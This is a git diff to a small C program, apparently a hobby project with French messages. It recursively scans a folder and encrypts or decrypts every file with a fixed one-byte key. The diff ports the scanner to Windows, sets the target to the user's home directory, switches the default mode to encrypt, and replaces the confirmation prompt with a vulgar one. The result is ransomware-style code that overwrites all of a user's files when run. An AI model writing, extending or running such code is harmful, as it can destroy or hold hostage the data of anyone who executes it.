@@ -1,6 +1,11 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <dirent.h>
+#ifdef _WIN32
+    #include <windows.h>
+
+#else
+    #include <dirent.h>
+#endif
 #include <string.h>
 
 void encrypt_file(char *filepath, unsigned char key)
@@ -70,37 +75,77 @@ void decrypt_file(char *filepath, unsigned char key) {
 
 void scan_folder(char *path, unsigned char key, int mode)
 {
-    DIR *doss = opendir(path);
-    struct dirent *dir;
-    char buffer[4096];
+    #ifdef _WIN32
+        HANDLE hfind; 
+        WIN32_FIND_DATAA findData;
 
-    if (doss == NULL)
-    {
-        perror("erreur dossier");
-        return;
-    }
-    
-    while ((dir = readdir(doss)) != NULL)
-    {
-        snprintf(buffer, sizeof(buffer), "%s/%s", path, dir->d_name);
+        char mask[4096];
+        snprintf(mask, sizeof(mask), "%s\\*", path);
 
-        if (dir->d_type == DT_REG)
+        hfind = FindFirstFileA(mask, &findData);
+
+        if (hfind == INVALID_HANDLE_VALUE)
         {
-            if (mode == 0 && strstr(dir->d_name, ".enc") == NULL) {
-                encrypt_file(buffer, key);
-            } 
-            else if (mode == 1 && strstr(dir->d_name, ".enc") != NULL) {
-                decrypt_file(buffer, key);
+            return;
+        }
+
+        do
+        {
+            char fullpath[4096];
+            snprintf(fullpath, sizeof(fullpath), "%s\\%s", path, findData.cFileName);
+
+            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
+
+            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
+            {
+                scan_folder(fullpath, key, mode);
+            }
+             else 
+            {
+                if (mode == 0 && strstr(findData.cFileName, ".enc") == NULL){
+                    encrypt_file(fullpath, key);
+                }
+                else if (mode == 1 && strstr(findData.cFileName, ".enc") != NULL){
+                    decrypt_file(fullpath, key);
+                }
+            }
+        } while (FindNextFileA(hfind, &findData));
+        
+
+        FindClose(hfind);
+        
+    #else
+        DIR *doss = opendir(path);
+        struct dirent *dir;
+        char buffer[4096];
+
+        if (doss == NULL)
+        {
+            perror("erreur dossier");
+            return;
+        }
+    
+        while ((dir = readdir(doss)) != NULL)
+        {
+            snprintf(buffer, sizeof(buffer), "%s/%s", path, dir->d_name);
+
+            if (dir->d_type == DT_REG)
+            {
+                if (mode == 0 && strstr(dir->d_name, ".enc") == NULL) {
+                    encrypt_file(buffer, key);
+                }    
+                else if (mode == 1 && strstr(dir->d_name, ".enc") != NULL) {
+                    decrypt_file(buffer, key);
+                }
+        }
+            else if (dir->d_type == DT_DIR)
+            {
+                if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;
+                scan_folder(buffer, key, mode);
             }
         }
-        else if (dir->d_type == DT_DIR)
-        {
-            if (strcmp(dir->d_name, ".") == 0 || strcmp(dir->d_name, "..") == 0) continue;
-            scan_folder(buffer, key, mode);
-        }
-    }
-
-    closedir(doss);
+        closedir(doss);
+    #endif
     
 }
 
@@ -109,7 +154,7 @@ int main(void)
 
     char *target_path;
     int key = 42;
-    int mode = 1;
+    int mode = 0;
 
     #ifdef _WIN32
         target_path = getenv("USERPROFILE");
@@ -127,7 +172,7 @@ int main(void)
         return 1;
     }
 
-    printf("Voulez-vous vraiment chiffrer %s ? (y/n)", target_path);
+    printf("Voulez-vous vraiment enculer votre ordinateur %s ? (y/n)", target_path);
     scanf(" %c", &choix);
 
     if (choix == 'y' || choix == 'Y')
